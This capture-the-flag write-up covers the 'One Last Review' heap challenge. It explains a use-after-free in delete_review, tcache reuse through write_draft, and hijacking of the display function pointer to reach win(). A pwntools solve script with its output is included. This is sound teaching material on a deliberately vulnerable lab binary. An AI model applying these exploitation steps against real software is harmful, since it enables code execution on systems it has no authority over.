# One Last Review - writeup (heap UAF, tcache reuse, indirect call to win)

## Getting to know the task

The archive gives two files:

- `chall.c` - the full C source of the program
- `chall` - the compiled binary (ELF64, NOT PIE, not stripped)

The program is an interactive console menu "leave a review" with 6 options:

```text
1. Submit a review
2. Mark review as favourite
3. Delete review
4. Write a draft
5. Preview favourite review
6. Leave
```

Goal: reach `win()`, which opens `flag.txt` and prints it.

Since the source is given, the fastest path is reading it: look for where objects are allocated, freed, and where indirect calls (function pointers) happen.

## Reading the source (what matters)

The key structure is the review:

```c
#define REVIEW_TEXT_SIZE 32

struct review {
    char text[REVIEW_TEXT_SIZE];   // offset 0x00, 32 bytes
    void (*display)(review_t *review);  // offset 0x20, a function pointer
};
```

So in memory a review is 40 bytes: 32 bytes of text + 8 bytes of a function pointer that displays it.

Immediately visible: `win()` exists in the code, marked `__attribute__((used, noinline))` (so the compiler does not strip it), and it does `fopen("flag.txt", "r")`:

```c
__attribute__((used, noinline))
void win(review_t *unused)
{
    char flag[256];
    FILE *file;

    file = fopen("flag.txt", "r");
    if (file == NULL) { puts("The prize envelope is missing..."); exit(1); }
    ...
    printf("Five stars! Here is your prize:\n%s", flag);
    exit(0);
}
```

The only problem: nothing in the menu calls it. So we need to hijack an indirect call and redirect it to `win`.

## The bug: delete_review leaves a dangling pointer

Looking at the delete function:

```c
static void delete_review(void)
{
    if (review == NULL) { puts("There is no review to delete."); return; }

    free(review);
    review = NULL;
    puts("Review deleted.");
}
```

The chunk is freed and `review` is nulled - but the global pointer `favourite` is **not touched** here. If the review was marked as favourite, `favourite` still points to the freed chunk. That is a classic **use-after-free**.

## The path to exploit it: write_draft reuses the chunk

`write_draft` shows how to use the dangling pointer:

```c
static void write_draft(void)
{
    long length;
    ...
    printf("Draft length (1-%zu): ", sizeof(draft->contents));
    length = read_number();
    if (length < 1 || (size_t)length > sizeof(draft->contents)) { ... }

    draft = malloc(sizeof(*draft));   // sizeof(draft_t) == sizeof(review_t) == 40
    ...
    memset(draft->contents, 0, sizeof(draft->contents));
    printf("Send exactly %ld draft bytes: ", length);
    read_exact(draft->contents, (size_t)length);
    ...
}
```

The draft is a struct `draft_t` whose size equals `review_t` (40 bytes) and which is entirely user-controlled data (the `contents` buffer). We choose `length` from 1 to 40, i.e. we can write **any 40 bytes**.

And the preview function is the target:

```c
static void preview_favourite(void)
{
    if (favourite == NULL) { ... }

    favourite->display(favourite);   // an indirect call through a pointer!
}
```

It makes an indirect call `display` from the struct `favourite` points at. If we can make `favourite` point to memory where we control the `display` field, we get an arbitrary function call.

## The attack plan

1. `submit_review` allocates a 40-byte chunk on the heap, fills `text`, sets `display = show_review`.
2. `mark_favourite` - `favourite = review`.
3. `delete_review` - `free(review)`, `review = NULL`. `favourite` stays dangling.
4. `write_draft` - `malloc(40)`. On the heap the freed chunk from step 3 has the same size, and **the tcache/fastbin reuses exactly it**. So `draft` now points to the same memory `favourite` dangles at.
5. Through `read_exact` we write our 40 bytes: 32 bytes of filler + `p64(addr_of_win)`.
6. `preview_favourite` - calls the `display` pointer (which we set to `win`). Win.

Because the binary is not PIE (type EXEC in readelf), the address of `win` is static and does not move. I take it from the symbol table:

```bash
$ nm chall | grep win
000000000040135f T win
```

## The exploit (scripts/solve.py)

```python
WIN = 0x40135F  # win() - static address, the binary is non-PIE
...
def run_exploit(r):
    payload = b"A" * 32 + p64(WIN)  # text[32] + display = win

    r.sendlineafter(b"> ", b"1")                          # submit a review
    r.sendlineafter(b"Review: ", b"Hello")                # review text
    r.sendlineafter(b"> ", b"2")                          # mark favourite: favourite = review
    r.sendlineafter(b"> ", b"3")                          # delete review: free(review), favourite dangles
    r.sendlineafter(b"> ", b"4")                          # write draft: malloc(40) reuses the freed chunk
    r.sendlineafter(b"Draft length (1-40): ", b"40")
    r.sendafter(b"Send exactly 40 draft bytes: ", payload)
    r.sendlineafter(b"> ", b"5")                          # preview favourite: calls display() = win()

    r.recvuntil(b"Five stars! Here is your prize:\n")
    return r.recvline().decode(errors="replace").strip()
```

Small details:

- On the instance the connection is wrapped in TLS (`ncat --ssl`), so pwntools needs `ssl=True` - without it the connection drops immediately.
- The draft length is sent with `sendlineafter` (the menu reads it with `strtol` from a line), while the 40 bytes are sent with `sendafter`: `read_exact` reads exactly 40 bytes, and a trailing `\n` would stay in the buffer and cause a harmless `Invalid choice.` before option 5.
- The payload contains null bytes (`p64(0x40135f)`), so it has to be sent as bytes, not as a "string".

## Verification, locally first

```bash
$ python3 scripts/solve.py --local
[*] local run, workdir /tmp/one_last_review_su91cyc9
FLAG: FortID{LOCAL_TEST_ONLY}
```

The script copies the binary into a temp dir and creates a `flag.txt` next to it with a dummy flag, so `assets/` stays clean. Locally it works on the first try.

## Remote

```bash
$ python3 scripts/solve.py baby-pwn-<INSTANCE>.inst14.ctf.fortid.com 1337
...
FLAG: FortID{W0ah_...}   (masked)
```

## Dead ends (what I considered and rejected)

1. **Overwriting the GOT.** Not needed and not easier: the indirect call in `preview_favourite` is a direct function-pointer call on a struct we fully control - no GOT involved.
2. **Stack overflow / format string.** None present in the source; the only function-pointer call is the review's `display`.
3. **Retrieving a libc leak first.** Unnecessary: `win` is in the binary itself at a fixed address, and the binary is not PIE. No libc base needed.

## One-paragraph version

One Last Review is a baby-heap challenge: a 40-byte review struct with a `display` function pointer, freed by `delete_review` while the global `favourite` still points at it (UAF). `write_draft` allocates the same 40-byte size, so the tcache reuses the freed chunk, and we fill it with 32 filler bytes + the static address of `win` (0x40135f, binary is not PIE). `preview_favourite` then calls the `display` field, which is now the address of `win` - the flag is printed.

## Lessons learned

1. A freed object with a live alias pointer (UAF) is only useful if you can re-fill the freed chunk with controlled data of the same size.
2. Function pointers in structs are the most direct hijack target: replace the pointer, and any later indirect call through it becomes arbitrary code execution.
3. A non-PIE binary makes a "win" function a fixed constant - no leak needed, just `nm` and pack the address.
4. Read the source for allocation sizes: `draft_t` being the same size as `review_t` is exactly what turns "freed chunk" into "reused chunk".

## Files

- `assets/chall.c` - the challenge source (as shipped)
- `assets/chall` - the binary (ELF64, not PIE, not stripped)
- `scripts/solve.py` - the exploit: `python3 solve.py <host> [port]` or `--local`